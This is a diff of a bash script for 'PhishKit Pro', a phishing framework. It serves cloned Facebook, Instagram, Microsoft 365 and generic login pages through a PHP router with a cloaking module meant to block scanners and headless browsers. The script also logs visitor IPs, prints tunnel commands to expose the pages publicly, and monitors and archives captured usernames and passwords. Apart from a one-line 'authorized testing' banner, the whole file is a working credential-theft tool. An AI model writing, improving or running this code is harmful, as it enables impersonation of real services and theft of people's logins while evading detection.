@@ -1,6 +1,7 @@
+'SHEOF'
 #!/bin/bash
 
-# PhishKit Pro — Evasion-Enhanced Phishing Framework
+# PhishKit Pro v3.2 — Anti-Detection Phishing Framework
 # For Authorized Security Testing Only
 
 RED='\033[1;31m'; GREEN='\033[1;32m'; BLUE='\033[1;34m'
@@ -9,6 +10,9 @@ YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; NC='\033[0m'
 HOST="127.0.0.1"
 PORT="8080"
 BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+SITES_DIR="$BASE_DIR/.sites"
+WWW_DIR="$BASE_DIR/.server/www"
+AUTH_DIR="$BASE_DIR/auth"
 
 banner() {
     clear
@@ -19,20 +23,30 @@ banner() {
     echo " |  __/| | | | \__ \   <| | | |_|_|"
     echo " |_|   |_| |_|_|___/_|\_\_|_|\__(_)"
     echo -e "${NC}"
-    echo -e "${CYAN}  PhishKit Pro v3.1 — Anti-Detection Framework${NC}"
+    echo -e "${CYAN}  PhishKit Pro v3.2 — Anti-Detection Framework${NC}"
     echo -e "${YELLOW}  For Authorized Security Testing Only${NC}"
     echo ""
 }
 
+check_deps() {
+    if ! command -v php &>/dev/null; then
+        echo -e "${RED}[-] PHP is not installed!${NC}"
+        echo -e "${YELLOW}[!] Install: apt install php -y${NC}"
+        exit 1
+    fi
+}
+
 list_templates() {
     echo -e "${BLUE}[+] Available Templates:${NC}\n"
+    local templates=()
     local i=1
-    for site in "$BASE_DIR/.sites"/*/; do
+    for site in "$SITES_DIR"/*/; do
+        [[ ! -d "$site" ]] && continue
         name=$(basename "$site")
         [[ "$name" == _* ]] && continue
-        # Show a description
+        templates+=("$name")
         case "$name" in
-            facebook)   desc="Facebook login page" ;;
+            facebook)   desc="Facebook login page (desktop + mobile)" ;;
             instagram)  desc="Instagram login page" ;;
             microsoft)  desc="Microsoft 365 login page" ;;
             generic)    desc="Generic branded login page" ;;
@@ -42,210 +56,243 @@ list_templates() {
         i=$((i+1))
     done
     echo ""
+    echo "${templates[@]}"
 }
 
 setup_site() {
     local site_name="$1"
-    local site_dir="$BASE_DIR/.sites/$site_name"
-    local www_dir="$BASE_DIR/.server/www"
+    local site_dir="$SITES_DIR/$site_name"
     
-    # Clean and prepare www directory
-    mkdir -p "$www_dir"
-    rm -rf "$www_dir"/*
+    echo -e "${BLUE}[+] Preparing server environment...${NC}"
+    mkdir -p "$WWW_DIR"
+    rm -rf "$WWW_DIR"/*
     
-    echo -e "${BLUE}[+] Setting up: ${WHITE}$site_name${NC}"
+    echo -e "${BLUE}[+] Setting up template: ${WHITE}$site_name${NC}"
     
-    # ===== COPY ALL template directories into www =====
-    # We copy ALL templates so the router can switch between them
-    for dir in "$BASE_DIR/.sites"/*/; do
+    # Copy all template directories
+    for dir in "$SITES_DIR"/*/; do
+        [[ ! -d "$dir" ]] && continue
         dirname=$(basename "$dir")
         [[ "$dirname" == _* ]] && continue
-        cp -r "$dir" "$www_dir/"
+        cp -r "$dir" "$WWW_DIR/"
     done
     
-    # ===== COPY router.php to www root =====
-    if [[ -f "$BASE_DIR/.sites/router.php" ]]; then
-        cp "$BASE_DIR/.sites/router.php" "$www_dir/router.php"
-        echo -e "${GREEN}[+] Router script loaded${NC}"
+    # Copy router
+    if [[ -f "$SITES_DIR/router.php" ]]; then
+        cp "$SITES_DIR/router.php" "$WWW_DIR/router.php"
+    else
+        cat > "$WWW_DIR/router.php" << 'ROUTEREOF'
+<?php
+$uri = $_SERVER['REQUEST_URI'];
+$path = parse_url($uri, PHP_URL_PATH);
+$path = rtrim($path, '/');
+$doc_root = $_SERVER['DOCUMENT_ROOT'];
+if ($path === '' || $path === '/') {
+    header('Location: /facebook/');
+    exit();
+}
+$ext = pathinfo($path, PATHINFO_EXTENSION);
+$static = ['css','js','png','jpg','jpeg','gif','svg','ico','webp'];
+if (in_array($ext, $static)) {
+    $file = $doc_root . $path;
+    if (file_exists($file)) { readfile($file); return true; }
+    $parts = explode('/', trim($path, '/'));
+    if (count($parts) >= 2) {
+        $alt = $doc_root . '/' . $parts[0] . '/' . implode('/', array_slice($parts, 1));
+        if (file_exists($alt)) { readfile($alt); return true; }
+    }
+}
+$direct = $doc_root . $path;
+if (file_exists($direct) && substr($direct, -4) === '.php') {
+    require $direct; return true;
+}
+$idx = $doc_root . $path . '/index.php';
+if (file_exists($idx)) {
+    $cloak = $doc_root . '/_cloak.php';
+    if (file_exists($cloak)) require_once $cloak;
+    require $idx; return true;
+}
+if (strpos($path, 'login') !== false) {
+    foreach (['facebook','instagram','microsoft','generic'] as $t) {
+        $f = $doc_root . '/' . $t . '/login.php';
+        if (file_exists($f)) { require $f; return true; }
+    }
+}
+$html = $doc_root . $path . '/index.html';
+if (file_exists($html)) { readfile($html); return true; }
+header('HTTP/1.0 404');
+header('Location: https://www.facebook.com');
+ROUTEREOF
     fi
+    echo -e "${GREEN}[+] Router loaded${NC}"
     
-    # ===== COPY _cloak.php to www root =====
-    if [[ -f "$BASE_DIR/.sites/_cloak.php" ]]; then
-        cp "$BASE_DIR/.sites/_cloak.php" "$www_dir/_cloak.php"
+    # Copy cloak
+    if [[ -f "$SITES_DIR/_cloak.php" ]]; then
+        cp "$SITES_DIR/_cloak.php" "$WWW_DIR/_cloak.php"
         echo -e "${GREEN}[+] Cloaking module loaded${NC}"
     fi
     
-    # ===== COPY ip.php to each template directory =====
-    if [[ -f "$BASE_DIR/.sites/ip.php" ]]; then
-        for dir in "$www_dir"/*/; do
-            cp "$BASE_DIR/.sites/ip.php" "$dir/"
+    # Copy ip.php to each template
+    if [[ -f "$SITES_DIR/ip.php" ]]; then
+        for dir in "$WWW_DIR"/*/; do
+            cp "$SITES_DIR/ip.php" "$dir/"
         done
+        echo -e "${GREEN}[+] IP logger loaded${NC}"
     fi
     
-    # ===== FIX: Update include paths in index.php files =====
-    # After copying, the structure is:
-    #   .server/www/_cloak.php
-    #   .server/www/facebook/index.php
-    # So from facebook/index.php, ../_cloak.php works correctly
-    for dir in "$www_dir"/*/; do
-        local index_file="$dir/index.php"
-        if [[ -f "$index_file" ]]; then
-            # Remove any complex path logic and replace with simple relative path
-            sed -i 's|__DIR__ . '"'"'/../../../.sites/_cloak.php'"'"'|__DIR__ . '"'"'/../_cloak.php'"'"'|g' "$index_file"
-            sed -i 's|__DIR__ . '"'"'/../../.sites/_cloak.php'"'"'|__DIR__ . '"'"'/../_cloak.php'"'"'|g' "$index_file"
-            sed -i 's|__DIR__ . '"'"'/../_cloak.php'"'"'|__DIR__ . '"'"'/../_cloak.php'"'"'|g' "$index_file"
-        fi
-    done
+    # Store active site
+    echo "$site_name" > "$WWW_DIR/.active_site"
     
-    # ===== FIX: Update cache.php to use correct paths =====
-    local cache_file="$www_dir/$site_name/cache.php"
-    if [[ -f "$cache_file" ]]; then
-        # cache.php reads login.html from the same directory, which works
-        :
-    fi
-    
-    # ===== START PHP SERVER with router =====
+    # Start server
+    echo ""
     echo -e "${BLUE}[+] Starting PHP server on ${WHITE}$HOST:$PORT${NC}"
-    echo -e "${BLUE}[+] Document root: ${WHITE}$www_dir${NC}"
+    pkill -f "php -S $HOST:$PORT" 2>/dev/null
+    sleep 0.5
     
-    # Use the router.php if it exists
-    if [[ -f "$www_dir/router.php" ]]; then
-        cd "$www_dir" && php -S "$HOST:$PORT" router.php > /dev/null 2>&1 &
-        echo -e "${GREEN}[+] Router-based server started${NC}"
-    else
-        cd "$www_dir" && php -S "$HOST:$PORT" > /dev/null 2>&1 &
-    fi
-    
+    cd "$WWW_DIR" && php -S "$HOST:$PORT" router.php > /dev/null 2>&1 &
     local pid=$!
     sleep 1.5
     
     if kill -0 $pid 2>/dev/null; then
-        echo -e "${GREEN}[+] Server running at: http://$HOST:$PORT/${NC}"
-        echo -e "${GREEN}[+] Template URL: http://$HOST:$PORT/$site_name/${NC}"
-        echo -e "${YELLOW}[!] The router will redirect / to /$site_name/${NC}"
+        echo -e "${GREEN}[+] Server is running!${NC}"
+        echo "$pid" > "$WWW_DIR/.server_pid"
     else
-        echo -e "${RED}[-] Failed to start PHP server.${NC}"
-        echo -e "${YELLOW}[!] Try: apt install php -y${NC}"
+        echo -e "${RED}[-] Server failed to start${NC}"
         exit 1
     fi
-    
-    # Save the selected site name for monitoring
-    echo "$site_name" > "$www_dir/.active_site"
 }
 
 tunnel_options() {
     local site_name="$1"
+    local local_ip=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}' || hostname -I 2>/dev/null | awk '{print $1}' || echo "127.0.0.1")
+    
     echo ""
-    echo -e "${CYAN}═══════════════════════════════════════════${NC}"
-    echo -e "${CYAN}  Tunnel Options (for external access)${NC}"
-    echo -e "${CYAN}═══════════════════════════════════════════${NC}"
+    echo -e "${CYAN}════════════════════════════════════════════════${NC}"
+    echo -e "${CYAN}      TUNNEL OPTIONS (External Access)${NC}"
+    echo -e "${CYAN}════════════════════════════════════════════════${NC}"
     echo ""
-    echo -e "  ${YELLOW}Option 1 — Serveo (no install needed):${NC}"
+    echo -e "  ${YELLOW}LAN Access (same network):${NC}"
+    echo -e "     ${GREEN}http://$local_ip:$PORT/$site_name/${NC}"
+    echo ""
+    echo -e "  ${YELLOW}Option 1 — Serveo (SSH, no install):${NC}"
     echo -e "     ${WHITE}ssh -R 80:localhost:$PORT serveo.net${NC}"
-    echo -e "     ${GREEN}URL: https://yourname.serveo.net/$site_name/${NC}"
     echo ""
     echo -e "  ${YELLOW}Option 2 — Ngrok:${NC}"
     echo -e "     ${WHITE}ngrok http $PORT${NC}"
-    echo -e "     ${GREEN}URL: https://xxxx.ngrok.io/$site_name/${NC}"
     echo ""
     echo -e "  ${YELLOW}Option 3 — Cloudflared:${NC}"
     echo -e "     ${WHITE}cloudflared tunnel --url http://localhost:$PORT${NC}"
-    echo -e "     ${GREEN}URL: https://xxxx.trycloudflare.com/$site_name/${NC}"
-    echo ""
-    echo -e "  ${YELLOW}Option 4 — Localhost.run:${NC}"
-    echo -e "     ${WHITE}ssh -R 80:localhost:$PORT nokey@localhost.run${NC}"
     echo ""
 }
 
 monitor() {
     local site_name="$1"
-    local www_dir="$BASE_DIR/.server/www"
-    local auth_dir="$BASE_DIR/auth"
-    local site_data_dir="$www_dir/$site_name"
+    mkdir -p "$AUTH_DIR"
     
-    mkdir -p "$auth_dir"
+    # Robust site data directory detection
+    local site_name_from_file=""
+    if [[ -f "$WWW_DIR/.active_site" ]]; then
+        site_name_from_file=$(cat "$WWW_DIR/.active_site")
+    fi
+    local monitor_dir="${site_name:-$site_name_from_file}"
+    if [[ -z "$monitor_dir" ]]; then
+        monitor_dir=$(ls -d "$WWW_DIR"/*/ 2>/dev/null | head -1 | xargs basename 2>/dev/null)
+    fi
+    local site_data_dir="$WWW_DIR/$monitor_dir"
     
-    echo -e "${YELLOW}[*] Monitoring for credentials... (Ctrl+C to stop)${NC}"
-    echo -e "${YELLOW}[*] Data directory: ${WHITE}$site_data_dir${NC}"
-    echo -e "${YELLOW}[*] Persistent storage: ${WHITE}$auth_dir/${NC}\n"
+    echo -e "${YELLOW}[*] Monitoring: ${WHITE}$site_data_dir${NC}"
+    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}\n"
     
-    # Track file modification times
-    local last_cred_mod=0
-    local last_ip_mod=0
-    local cred_file="$site_data_dir/usernames.txt"
-    local ip_file="$site_data_dir/ip.txt"
+    declare -A last_hashes
+    
+    # Initialize with existing hashes
+    for f in "$WWW_DIR"/*/usernames.txt; do
+        [[ -f "$f" ]] && last_hashes["$f"]=$(md5sum "$f" 2>/dev/null | awk '{print $1}')
+    done
+    
+    echo -e "${CYAN}[*] Waiting for targets...${NC}"
     
     while true; do
-        # Check credentials
-        if [[ -f "$cred_file" ]]; then
-            local current_mod=$(stat -c %Y "$cred_file" 2>/dev/null || echo 0)
-            if (( current_mod > last_cred_mod )); then
-                echo -e "${RED}┌──────────────────────────────────────────┐${NC}"
-                echo -e "${RED}│${GREEN}        CREDENTIALS CAPTURED!             ${RED}│${NC}"
-                echo -e "${RED}└──────────────────────────────────────────┘${NC}"
-                cat "$cred_file"
-                cp "$cred_file" "$auth_dir/credentials_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null
-                cp "$cred_file" "$auth_dir/latest_credentials.txt" 2>/dev/null
-                last_cred_mod=$current_mod
+        for cred_file in "$WWW_DIR"/*/usernames.txt; do
+            [[ ! -f "$cred_file" ]] && continue
+            local current_hash=$(md5sum "$cred_file" 2>/dev/null | awk '{print $1}')
+            local prev_hash="${last_hashes["$cred_file"]}"
+            
+            if [[ "$current_hash" != "$prev_hash" ]] && [[ -n "$current_hash" ]]; then
+                local template_name=$(basename "$(dirname "$cred_file")")
+                local timestamp=$(date '+%H:%M:%S')
+                
                 echo ""
+                echo -e "${RED}┌─────────────────────────────────────────────┐${NC}"
+                echo -e "${RED}│${GREEN}      ✅ CREDENTIALS CAPTURED! ${RED}              │${NC}"
+                echo -e "${RED}│${WHITE}      Template: $template_name${RED}               │${NC}"
+                echo -e "${RED}│${WHITE}      Time: $timestamp${RED}                       │${NC}"
+                echo -e "${RED}└─────────────────────────────────────────────┘${NC}"
+                echo ""
+                cat "$cred_file"
+                echo ""
+                echo -e "${CYAN}────────────────────────────────────────────${NC}"
+                
+                # Save to auth
+                cp "$cred_file" "$AUTH_DIR/${template_name}_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null
+                cp "$cred_file" "$AUTH_DIR/latest_capture.txt" 2>/dev/null
+                
+                last_hashes["$cred_file"]="$current_hash"
             fi
-        fi
-        
-        # Check IP log
-        if [[ -f "$ip_file" ]]; then
-            local current_ip_mod=$(stat -c %Y "$ip_file" 2>/dev/null || echo 0)
-            if (( current_ip_mod > last_ip_mod )); then
-                # New IP logged
-                last_ip_mod=$current_ip_mod
-                tail -1 "$ip_file" >> "$auth_dir/visitors.log" 2>/dev/null
-            fi
-        fi
-        
+        done
         sleep 1
     done
 }
 
 cleanup() {
-    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
+    echo ""
+    echo -e "${YELLOW}[*] Shutting down...${NC}"
+    if [[ -f "$WWW_DIR/.server_pid" ]]; then
+        kill $(cat "$WWW_DIR/.server_pid") 2>/dev/null
+    fi
     pkill -f "php -S $HOST:$PORT" 2>/dev/null
-    rm -rf "$BASE_DIR/.server"
-    echo -e "${GREEN}[+] Done.${NC}"
+    
+    # Save any remaining captured data
+    if [[ -d "$WWW_DIR" ]]; then
+        for cred_file in "$WWW_DIR"/*/usernames.txt; do
+            if [[ -f "$cred_file" ]]; then
+                local template=$(basename "$(dirname "$cred_file")")
+                cp "$cred_file" "$AUTH_DIR/${template}_final.txt" 2>/dev/null
+            fi
+        done
+        echo -e "${GREEN}[+] Data saved to $AUTH_DIR/${NC}"
+    fi
+    
+    rm -rf "$WWW_DIR"
+    echo -e "${GREEN}[+] Cleanup complete${NC}"
     exit 0
 }
 
 main() {
+    trap cleanup EXIT INT TERM
     banner
-    list_templates
+    check_deps
     
-    echo -ne "${CYAN}[?] Select template number: ${NC}"
+    local templates=($(list_templates))
+    
+    echo -ne "${CYAN}[?] Select template [1-${#templates[@]}]: ${NC}"
     read choice
     
-    local i=1
-    local selected=""
-    for site in "$BASE_DIR/.sites"/*/; do
-        name=$(basename "$site")
-        [[ "$name" == _* ]] && continue
-        if [[ $i -eq $choice ]]; then
-            selected="$name"
-            break
-        fi
-        i=$((i+1))
-    done
-    
-    if [[ -z "$selected" ]]; then
+    if ! [[ "$choice" =~ ^[0-9]+$ ]] || [[ $choice -lt 1 ]] || [[ $choice -gt ${#templates[@]} ]]; then
         echo -e "${RED}[-] Invalid selection${NC}"
         exit 1
     fi
     
-    trap cleanup EXIT INT TERM
-    
+    local selected="${templates[$((choice-1))]}"
     setup_site "$selected"
     tunnel_options "$selected"
     
     echo ""
-    echo -e "${GREEN}[+] Share this URL: http://$HOST:$PORT/$selected/${NC}"
-    echo -e "${YELLOW}[!] The cloaking layer blocks scanners & bots${NC}"
-    echo -e "${YELLOW}[!] Real users see the login page after verification${NC}"
+    echo -e "${GREEN}[+] ===== TARGET URL =====${NC}"
+    echo -e "${GREEN}[+] http://$HOST:$PORT/$selected/${NC}"
+    echo -e "${GREEN}[+] ======================${NC}"
+    echo ""
+    echo -e "${YELLOW}[!] Cloaking blocks scanners, bots, and headless browsers${NC}"
     echo ""
     echo -ne "${CYAN}[?] Press Enter to start monitoring...${NC}"
     read
@@ -254,3 +301,4 @@ main() {
 }
 
 main
+SHEOF
